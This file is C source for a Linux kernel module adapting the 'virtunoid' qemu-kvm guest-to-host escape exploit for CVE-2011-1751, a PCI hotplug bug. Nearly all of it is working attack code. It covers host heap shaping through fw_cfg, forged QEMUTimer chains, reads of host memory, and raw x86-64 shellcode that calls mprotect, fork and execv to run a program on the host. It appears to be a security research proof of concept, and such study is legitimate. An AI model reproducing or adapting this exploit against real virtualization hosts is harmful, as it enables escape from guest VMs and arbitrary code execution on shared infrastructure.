#include <linux/module.h>
#include <linux/init.h>
#include <linux/in.h>
#include <net/sock.h>
#include <linux/skbuff.h>
#include <linux/delay.h>
#include <linux/inet.h>
#include <linux/icmp.h>

#include <linux/gfp.h> //__get_free_pages
#include <linux/syscalls.h>
#include <asm/io.h>		// for virt_to_phys()

#include "virtunoid-config.h"
//#include "shellcode-config.h"
#define QEMU_GATEWAY  0x0202000a //"10.0.2.2"
//#define QEMU_GATEWAY  0x017aa8c0//"192.168.122.1"

#include <stdarg.h>
#include <linux/rtc.h>
#include <linux/delay.h>
#include <linux/errno.h>

typedef uint64_t hva_t;
typedef uint64_t gpa_t;
typedef uint64_t gfn_t;
typedef void    *gva_t;

#define PAGE_SHIFT  12
#define PAGE_SHIFT_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_SWAPPED (1ull << 62)
#define PFN_PFN     ((1ull << 55) - 1)

#define BIOS_CFG_IOPORT 0x510
#define BIOS_CFG_DATAPORT (BIOS_CFG_IOPORT + 1)
#define FW_CFG_WRITE_CHANNEL    0x4000
#define FW_CFG_ARCH_LOCAL       0x8000

#define FW_CFG_E820_TABLE (FW_CFG_ARCH_LOCAL + 3)
#define FW_CFG_HPET (FW_CFG_ARCH_LOCAL + 4)

#define PORT 0xae08

//////////////////////////////////
#include <asm/mman.h>
int mprotect(const void *addr, size_t len, int prot);
pid_t fork(void);
int execv(const char *path, char *const argv[]);

int die_errno(const char *msg) {
    printk("error: %s.\n", msg);
    return -1;
}

int assert(int val){
    if(val != 1){
        printk("assert fail.\n");
        return -1;
    }
    return 0;
}

struct IORange *align_kmalloc(int cache_size){
    struct IORange *object;

    static struct kmem_cache *align_cache_p;
    align_cache_p = kmem_cache_create("align_cache", cache_size, 0, SLAB_HWCACHE_ALIGN, NULL);
    if (!align_cache_p)
        die_errno("align_kmalloc");

    object = kmem_cache_alloc(align_cache_p, GFP_KERNEL);

    return object;
}

//from stackoverflow
#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>

struct file* file_open(const char* path, int flags, int rights) {
    struct file* filp = NULL;
    mm_segment_t oldfs;
    int err = 0;

    oldfs = get_fs();
    set_fs(get_ds());
    filp = filp_open(path, flags, rights);
    set_fs(oldfs);
    if(IS_ERR(filp)) {
        err = PTR_ERR(filp);
        return NULL;
    }
    return filp;
}

//Close a file (similar to close):
void file_close(struct file* file) {
    filp_close(file, NULL);
}

//Reading data from a file (similar to pread):
int file_read(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size) {
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_read(file, data, size, &offset);
    if (offset != 0)
      printk("offset is %lli\n",offset);
    set_fs(oldfs);
    return ret;
}

//Writing data to a file (similar to pwrite):
int file_write(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size) {
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_write(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

//Syncing changes a file (similar to fsync):
int file_sync(struct file* file) {
    vfs_fsync(file, 0);
    return 0;
}

//////////////////////////////////
//begin portbunny
static struct {
    struct cmsghdr cm;
    struct in_pktinfo ipi;
}cmsg = { {sizeof(struct cmsghdr) + sizeof(struct in_pktinfo), SOL_IP, IP_PKTINFO}, {0, }};

/* Taken from iputils ping.c */
u_short
in_cksum(const u_short *addr, register int len, u_short csum)
{
    register int nleft = len;
    const u_short *w = addr;
    register u_short answer;
    register int sum = csum;

    /*
     *  Our algorithm is simple, using a 32 bit accumulator (sum),
     *  we add sequential 16 bit words to it, and at the end, fold
     *  back all the carry bits from the top 16 bits into the lower
     *  16 bits.
     */
    while (nleft > 1)  {
        sum += *w++;
        nleft -= 2;
    }

    /* mop up an odd byte, if necessary */
    if (nleft == 1)
        sum += htons(*(u_char *)w << 8);

    /*
     * add back carry outs from top 16 bits to low 16 bits
     */
    sum = (sum >> 16) + (sum & 0xffff);    /* add hi 16 to low 16 */
    sum += (sum >> 16);            /* add carry */
    answer = ~sum;                /* truncate to 16 bits */
    return (answer);
}

//end portbunny

/* virtunoid.c: qemu-kvm escape exploit, 0.13.51 <= qemu-kvm <= 0.14.50
 *  by Nelson Elhage <nelhage@nelhage.com>
 *
 * Exploits CVE-2011-1751, insufficient checks in PCI hotplug.
 *
 * The underlying bug exists since qemu-kvm 0.11.51, but this exploit
 * uses features introduced in qemu-kvm 0.13.51. We choose to do this
 * for simplicity, and in order to limit the scope of this exploit,
 * since this is intended as a proof-of-concept.
 *
 * I presented on this bug at BlackHat/DEFCON 2011. Slides are
 * available at <http://nelhage.com/talks/kvm-defcon-2011.pdf>, and
 * include a detailed discussion of this exploit.
 */


/***********************************************************************/

struct QEMUClock {
    uint32_t type;
    uint32_t enabled;
};

struct QEMUTimer {
    hva_t clock;
    int64_t expire_time;
#ifdef HAVE_TIMER_SCALE
    int scale;
#endif
    hva_t cb;           /* void (*)(void*) */
    hva_t opaque;       /* void* */
    hva_t next;         /* struct QEMUTimer * */
};

struct IORangeOps {
    /*    void (*read)(IORange *iorange, uint64_t offset, unsigned width,
              uint64_t *data);
          void (*write)(IORange *iorange, uint64_t offset, unsigned width,
              uint64_t data);
    */
    hva_t read;
    hva_t write;
};

struct IORange {
    hva_t ops;
    uint64_t base;
    uint64_t len;
};

/*********************************************************************/

/*
 * These structures describe the writable fw_cfg regions in the
 * host. We keep a shadow copy of those regions, and
 * commit_targets()/read_targets() sync between our shadow regions and
 * the real buffers on the host.
 *
 * gva_to_hva knows about these shadow regions and uses the fw_cfg
 * addresses when possible.
 *
 * host_alloc implements a simple first-fit allocator into the shadow
 * regions.
 *
 * snapshot_targets/rollback_targets implement a checkpoint/restore
 * mechanism on the allocator state. This is used to first allocate a
 * bunch of structures that will be needed for every timer chain, then
 * take a checkpoint before executing individual timer chains, after
 * which the state can be rolled back.
 *
 */
struct target_region {
    hva_t hva;
    uint8_t *data;
    size_t len;
    uint16_t entry;
    uint8_t *alloc;
    uint8_t *snapshot;
};

uint8_t buf[SIZEOF_E820_TABLE+2*PAGE_SHIFT_SIZE+SIZEOF_HPET_CFG];

struct target_region targets[] = {
    { E820_TABLE, buf, SIZEOF_E820_TABLE, FW_CFG_E820_TABLE },
    { HPET_CFG, buf + SIZEOF_E820_TABLE + PAGE_SHIFT_SIZE, SIZEOF_HPET_CFG, FW_CFG_HPET },
    { 0, 0, 0, 0}
};

uint64_t *fake_rtc;

void commit_targets(void) {
    struct target_region *t = targets;
    fake_rtc[OFFSET_RTCSTATE_NEXT_SECOND_TIME/sizeof(*fake_rtc)] = 10;
    for (; t->data; t++) {
        int i;
        outw(FW_CFG_WRITE_CHANNEL | t->entry, BIOS_CFG_IOPORT);
        for (i = 0; i < t->len - 1; i++)
            outb(t->data[i], BIOS_CFG_DATAPORT);
#ifdef DEBUG_COMMIT
        outw(FW_CFG_WRITE_CHANNEL | t->entry, BIOS_CFG_IOPORT);
        for (i = 0; i < t->len - 1; i++)
            assert(inb(BIOS_CFG_DATAPORT) == t->data[i]);
#endif
    }
}

void refresh_targets(void) {
    struct target_region *t = targets;
    for (; t->data; t++) {
        int i;
        outw(FW_CFG_WRITE_CHANNEL | t->entry, BIOS_CFG_IOPORT);
        for (i = 0; i < t->len - 1; i++)
            t->data[i] = inb(BIOS_CFG_DATAPORT);
    }
}

void snapshot_targets(void) {
    struct target_region *t = targets;
    for (; t->data; t++)
        t->snapshot = t->alloc;
}

void rollback_targets(void) {
    struct target_region *t = targets;
    for (; t->data; t++)
        t->alloc = t->snapshot;
}

void *host_alloc(size_t size) {
    struct target_region *t = targets;
    for (; t->data; t++) {
        size_t free;
        if (!t->alloc) {
            t->alloc = t->data;
        }
        free = t->data + t->len - 1 - t->alloc;
        if (free >= size) {
            void *p = t->alloc;
            t->alloc += size;
            return p;
        }
    }
    printk("host_alloc(%d) failed!\n", (unsigned)size);
    assert(0);
    return NULL;
}

void* obj_alloc(size_t start, size_t last) {
    size_t need = last - start;
    void *ptr = host_alloc(need);
    return ptr - start;
}

/*********************************************************************/

uint32_t addr_page_offset(unsigned long addr) {
    return addr & ((1 << PAGE_SHIFT) - 1);
}

gfn_t gva_to_gfn(gva_t addr) {
    //static int fd = -1;
    struct file *fd = NULL;
    //size_t off;
    loff_t off;
    uint64_t pte, pfn;
    int len=0;

    if (fd == NULL)
        fd = file_open("/proc/self/pagemap", O_RDONLY, 0);
        //fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd == NULL)
        die_errno("open");
    off = ((uintptr_t)addr >> 9) & ~7;
    //if (lseek(fd, off, SEEK_SET) != off)
    if (generic_file_llseek(fd, off, SEEK_SET) != off)
        die_errno("lseek");

    //if (vfs_read(fd, (unsigned char *)&pte, 8, 0) != 8)
    if ((len=file_read(fd, 0, (unsigned char *)&pte, 8)) != 8)//sys_read
        die_errno("read");
    if (!(pte & PFN_PRESENT))
        return (gfn_t)-1;

    pfn = pte & PFN_PFN;
    return pfn;
}

gpa_t gva_to_gpa_j(gva_t addr) {
  unsigned long paddr = virt_to_phys(addr);
  printk("Translated virtual address %016lx to phys addr %016lx\n",
         (long unsigned int)addr,
         (long unsigned int)paddr);
  return paddr;
}

gpa_t gva_to_gpa(gva_t addr) {
    gfn_t gfn = gva_to_gfn(addr);
    assert(gfn != (gfn_t)-1);
    return (gfn << PAGE_SHIFT) | addr_page_offset((unsigned long)addr);
}

hva_t highmem_hva_base = 0;

hva_t gpa_to_hva(gpa_t gpa) {
    assert (gpa > 0x00100000);
    return gpa  + highmem_hva_base;
}

hva_t gva_to_hva(gva_t addr) {
    struct target_region *r;
    for (r = targets; r->data; r++)
        if (addr > (gva_t)r->data - PAGE_SHIFT_SIZE &&
            addr < (gva_t)r->data + r->len) {
            return r->hva + (addr - (gva_t)r->data);
        }

    return gpa_to_hva(gva_to_gpa_j(addr));
}

/*
 * This structure is used to communicate data between the host and
 * guest post-exploitation.
 */
#define page_aligned __attribute__((aligned(PAGE_SHIFT_SIZE)))

struct shared_state {
    char prog[1024];
    hva_t shellcode;
    int done;
};

static volatile page_aligned struct shared_state share = {
  .prog = "/usr/bin/gnome-calculator"
  
};

void shellcode(struct shared_state *share) {
    char *args[2];
    ((void(*)(int, int))ISA_UNASSIGN_IOPORT)(0x70, 2);
    ((typeof(mprotect)*)MPROTECT)((void*)share->shellcode,
                                  2*PAGE_SHIFT_SIZE,
                                  PROT_READ|PROT_WRITE|PROT_EXEC);
    //char *args[2] = {share->prog, NULL};
    args[0] = share->prog;
    args[1] = NULL;
    if (((typeof(fork)*)FORK)() == 0)
        ((typeof(execv)*)EXECV)(share->prog, args);
    share->done = 1;
}
asm("end_shellcode:");
extern char end_shellcode[];

/*
 * Construct and return a single fake timer, with the specified
 * fields.
 */
struct QEMUTimer *fake_timer(hva_t cb, hva_t opaque, struct QEMUTimer *next) {
    struct QEMUTimer *timer = host_alloc(sizeof *timer);
    memset(timer, 0, sizeof *timer);
    timer->clock = CLOCK_HVA;
#ifdef HAVE_TIMER_SCALE
    timer->scale = 1;
#endif
    timer->cb = cb;
    timer->opaque = opaque;
    timer->next = next ? gva_to_hva(next) : 0;
    return timer;
}

/*
 * Construct a timer chain that performs an mprotect() and then calls
 * into shellcode.
 */
struct QEMUTimer *construct_payload_j(void) {
    struct IORange *ioport;
    struct IORangeOps *ops;
    struct QEMUTimer *timer;
    unsigned  long int mask = ~(PAGE_SIZE-1ull);
    //int i;
    int len = 0x69;//0x7c;
    uint8_t* ptr8;
    uint32_t* ptr32;

         const char* sc = "\x55\
\x48\x8d\x2d\xf8\xff\xff\xff\
\x31\xf6\x83\xc6\x02\
\x31\xff\x83\xc7\x70\
\x8b\x45\x67\
\xff\xd0\
\x48\x83\xec\x20\
\x48\x8d\x45\x4d\
\x48\x89\x44\x24\x10\
\x31\xc0\x48\x89\x44\x24\x18\
\x8b\x45\x6b\
\xff\xd0\
\x85\xc0\
\x75\x15\
\x48\x8d\x54\x24\x10\
\x48\x8b\x02\
\x48\x89\xd6\
\x48\x89\xc7\
\x8b\x45\x6f\
\xff\xd0\
\x48\x83\xc4\x20\
\x5d\
\xc3/usr/bin/gnome-calculator";
         printk(sc);
         len = strlen(sc)+1;

    printk("shellcode len is %i\n",len);


    printk("mask is %016lx\n",mask);


    ops = kmalloc(sizeof *ops,GFP_ATOMIC);
    if (ops ==NULL){
        printk("kmalloc failed\n");
        while(1);
    }

    ops->read = MPROTECT;
    ops->write = 0;


    ioport = (struct IORange*) kmalloc(3*PAGE_SIZE,GFP_ATOMIC);
    printk("IORange size is %li\n",sizeof(struct IORange));
    printk("ioport is %016lx\n",(long unsigned int) ioport);
    printk("ioport + 1 is 0x%lx\n",(long unsigned int)((char*) (ioport+1)));

    mask = (long unsigned int)ioport;

    mask = mask >> 12;
    mask = mask << 12;/*
        for(i=0; i< 12;i++)
      mask = mask /2 ;
    for(i=0; i < 12; i++)
      mask = mask *2;
                      */

    mask += PAGE_SIZE;

    ioport = (struct IORange*)mask;
    /*  (
                                 ((unsigned long int)ioport )
                                 | ~(PAGE_SIZE-1)
                                 )+PAGE_SIZE);*/
    printk("ioport is %016lx\n", (long unsigned int)ioport);



    ioport->ops = gva_to_hva(ops);
    ioport->base = -(2*PAGE_SIZE);



    share.shellcode = gva_to_hva(ioport);



    //printk("sc is 0x%x",*((int*)sc));
    //memcpy(ioport + 1, sc, len);
    printk("%i bytes of shellcode written\n",
           sprintf((char*)  (ioport+1),sc));//&len));
    printk((char*)(ioport+1));
    ptr8 = (uint8_t*)(ioport+1);
    ptr8 += len;
    ptr32 = (uint32_t*)ptr8;
    *ptr32++ = ISA_UNASSIGN_IOPORT;
    *ptr32++ = FORK;
    *ptr32++ = EXECV;

    printk("EXECV is %x\n",*--ptr32);
    timer = NULL;
    timer = fake_timer(gva_to_hva(ioport+1), gva_to_hva((void*)&share), timer);//joke

    //    timer = fake_timer(0xdeadbeef\xcafebabe,timer);

    //timer = fake_timer(0, 0 ,timer);//print 40ascii '@'
    //timer = fake_timer(CPU_OUTL, 0x5e155e, timer);//
    timer = fake_timer(IOPORT_READL_THUNK, gva_to_hva(ioport), timer);
    timer = fake_timer(CPU_OUTL, 0, timer);//0x5e155e

    printk("leaving construct_payload\n");
    return timer;
}


struct QEMUTimer *construct_payload(void) {
    struct IORange *ioport;
    struct IORangeOps *ops;
    struct QEMUTimer *timer;

    ops = kmalloc(sizeof *ops, GFP_ATOMIC);
    ops->read = MPROTECT;
    ops->write = 0;

    ioport = align_kmalloc(2*PAGE_SHIFT_SIZE);
    ioport->ops = gva_to_hva(ops);
    ioport->base = -(2*PAGE_SHIFT_SIZE);

    share.shellcode = gva_to_hva(ioport);

    memcpy(ioport + 1, shellcode, (void*)end_shellcode - (void*)shellcode);

    timer = NULL;
    timer = fake_timer(gva_to_hva(ioport+1), gva_to_hva((void*)&share), timer);
    timer = fake_timer(IOPORT_READL_THUNK, gva_to_hva(ioport), timer);
    timer = fake_timer(CPU_OUTL, 0, timer);
    return timer;
}

/*
 * Construct a timer chain that reads a single 4-byte value from the
 * host, and writes a pointer to the result into *out.
 */
struct QEMUTimer *construct_read(struct QEMUTimer *timer, hva_t hva, uint32_t **out) {
    uint32_t *ptr = host_alloc(sizeof *ptr);
    *out = ptr;

    timer = fake_timer(BDRV_RW_EM_CB, gva_to_hva(ptr), timer);
    timer = fake_timer(KVM_ARCH_DO_IOPERM, hva - 8, timer);
    timer = fake_timer(QEMU_GET_RAM_PTR, 1<<20, timer);

    return timer;
}


/*
 * Read and return 8 bytes from the host.
 *
 * The timer 'head' is currently queued on the host's timer queues,
 * and after return, 'chain' will be queued.
 */
uint64_t read_host8(struct QEMUTimer *head, struct QEMUTimer *chain, hva_t addr) {
    uint64_t val = 0;
    uint32_t *low, *hi;

    struct QEMUTimer *timer = chain;
    timer->next = 0;
    timer = construct_read(timer, addr, &low);
    timer = construct_read(timer, addr + 4, &hi);
    head->next = gva_to_hva(timer);
    head->expire_time = 0;
    *hi = (uint32_t)-1;
    commit_targets();
    while (*hi == (uint32_t)-1) {
        mdelay(1000);
        refresh_targets();
    }
    val = ((uint64_t)*hi << 32) | (uint64_t)*low;
    rollback_targets();
    return val;
}

/*
 * Massage the RTC into a convenient state for the exploit. Wait for a
 * "UIE" interrupt, indicating the end of an update cycle, and then
 * set register 10 to disable normal updating of the RTC. This has the
 * effect of cutting rtc_update_second2 out of the loop, and just
 * making rtc_update_second get called once a second.
 *
 * This is relevant because free() clobbers ->second_timer2, so if we
 * don't make this change, we risk a SEGV if second_timer2 gets
 * re-scheduled before we can exploit the bug.
 *
 * See qemu-kvm:hw/mc146818rtc.c for the relevant code.
 */
void wait_rtc_j(void) {
    struct file *fd;
    int val;
    struct rtc_device *rtc;
    int len=0;

    if ((fd = file_open("/dev/rtc", O_RDONLY,0)) == NULL )//sys_open
          die_errno("open(/dev/rtc)");
      
    if ((rtc = rtc_class_open("rtc0")) == NULL)
        die_errno("open rtc0 failed");
    //  mutex_unlock(&rtc->ops_lock);
    rtc_update_irq_enable(rtc, 1);
    printk("[+] UIE has been turned on\n");
  
    //int file_read(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size) {
    if ((len=file_read(fd,0, (unsigned char *)&val, sizeof val)) != sizeof(val)){//sys_read
        printk("error in read()\n");
  	printk("len was %i\n",len);
  	printk("fd->f_op is %016lx\n",(long unsigned int)fd->f_op);
  	printk("fd->f_op->read is %016lx\n",(long unsigned int)fd->f_op->read);
  	printk("fd->f_op->aio_read is %016lx\n",(long unsigned int)fd->f_op->aio_read);
  	printk("size of val is %li\n",sizeof val);
  	
  	while(1);
    }
  
    rtc_update_irq_enable(rtc, 0);
    printk("RTC_UIE turned off\n");
    rtc_class_close(rtc);
    file_close(fd);
    outb(10,   0x70);
    outb(0xF0, 0x71);
}

void wait_rtc(void) {
    struct file *fd;
    struct rtc_device *rtc;

    int val;
    if ((fd = file_open("/dev/rtc", O_RDONLY, 0)) == NULL)
        die_errno("open(/dev/rtc)");
    rtc = fd->private_data;
    if (rtc_update_irq_enable(rtc, 1) < 0)
        die_errno("RTC_UIE_ON");
    if (file_read(fd, 0, (unsigned char *)&val, sizeof val) != sizeof(val))
        die_errno("read()");
    if (rtc_update_irq_enable(rtc, 0) < 0)
        die_errno("RTC_UIE_OFF");
    file_close(fd);
    outb(10,   0x70);
    outb(0xF0, 0x71);
}

static int __init server_init( void )
{
    mm_segment_t oldfs;

    int i;
    unsigned char packet[SIZEOF_RTCSTATE - PACKET_OFFSET];

    int len = sizeof(packet);
    struct icmphdr *icmp = (struct icmphdr*)packet;
    struct sockaddr_in dest = {};

    struct QEMUTimer *timer, *timer2;
    hva_t timer_hva;
    hva_t ram_block;

    struct iovec iov;
    struct socket *sock;

    int ret = sock_create(AF_INET, SOCK_RAW, IPPROTO_ICMP, &sock);
    struct msghdr msg = { &dest, sizeof(dest),
              &iov, 1, &cmsg, 0, 0 };

    /* check if socket-creation was successful */
    if(ret < 0){
        printk("error creating socket\n");
        return -1;
    }

  
    printk("[+] ENTER MODULE.\n");

    oldfs = get_fs();
    set_fs(get_ds());

    memset(buf, 0, sizeof buf);
    memset(packet, 0x33, sizeof(packet));

    assert(OFFSET_RTCSTATE_NEXT_SECOND_TIME <
           OFFSET_RTCSTATE_SECOND_TIMER);
    fake_rtc = obj_alloc(OFFSET_RTCSTATE_NEXT_SECOND_TIME,
                    SIZEOF_RTCSTATE);

    timer = fake_timer(RTC_UPDATE_SECOND, gva_to_hva(fake_rtc), 0);
    timer2 = fake_timer(RTC_UPDATE_SECOND, gva_to_hva(fake_rtc), 0);
    timer_hva = gva_to_hva(timer);

    // memset(rtc, 0x77, SIZEOF_RTCSTATE);
    fake_rtc[OFFSET_RTCSTATE_SECOND_TIMER/sizeof(*fake_rtc)] = timer_hva;
    fake_rtc[OFFSET_RTCSTATE_NEXT_SECOND_TIME/sizeof(*fake_rtc)] = 10;

#define RTC(type, offset) (type*)(packet + (offset) - PACKET_OFFSET)

    *RTC(hva_t, OFFSET_RTCSTATE_SECOND_TIMER) = timer_hva;
    *RTC(uint64_t, OFFSET_RTCSTATE_NEXT_SECOND_TIME) = 10;

    snapshot_targets();

    //if (sys_iopl(3))
    //    printk("iopl");

    commit_targets();

    printk("[+] Constructing socket...\n");
    /* fillout sockaddr_in-structure whereto */
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = QEMU_GATEWAY;

    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.id = 0xabcd;
    icmp->un.echo.sequence = htons(1);
    icmp->checksum = 0;

    iov.iov_base = packet;
    iov.iov_len = sizeof(packet);

    /* calculate icmp-checksum */
    icmp->checksum = in_cksum((void*)&packet, len, 0);

    printk("[+] Waiting for RTC interrupt...\n");
    wait_rtc();
    printk("[+] Triggering hotplug...\n");
    outl(2, PORT);
    printk("[+] Done hotplug...\n");
    i = 0;
    while (timer->expire_time == 0) {
        //printk("[+] i=%d, packet=%s.\n", i, packet);
        sock_sendmsg(sock, &msg, len);
        if (++i % 1000 == 0){
            //printk("[+] refresh_targets: timer->expire_time=%d.\n", timer->expire_time);
            refresh_targets();
            //break;
        }
    }
    sock_release(sock);
    sock = NULL;

    printk("[+] Timer list hijacked. Reading highmem base...\n");
    ram_block = read_host8(timer, timer2, ADDR_RAMLIST_FIRST);

    printk("[+] ram_block = %016lx\n", (unsigned long int)ram_block);
    highmem_hva_base = read_host8(timer, timer2, ram_block);
    printk("[+] highmem hva base = %016lx\n", (unsigned long int)highmem_hva_base);
    printk("[+] Go!\n");

    //safe to here
    timer->next   = gva_to_hva(construct_payload_j());
    timer->expire_time = 0;
    //               while(1);

    set_fs(oldfs);
    commit_targets();

    printk("payload at hva %016lx\n",(unsigned long int)timer->next);

    while (!share.done)
	mdelay(1000);
    printk("[+] Done!\n");

    return 0;
}

static void __exit server_exit( void )
{
    printk("EXIT MODULE");
}

#include <asm/apic.h>
void foo(void){
    //#define APIC ((uint64_t*)0xffffffff81668678)
    apic->write(0,0);
}

module_init(server_init);
module_exit(server_exit);
MODULE_LICENSE("GPL");
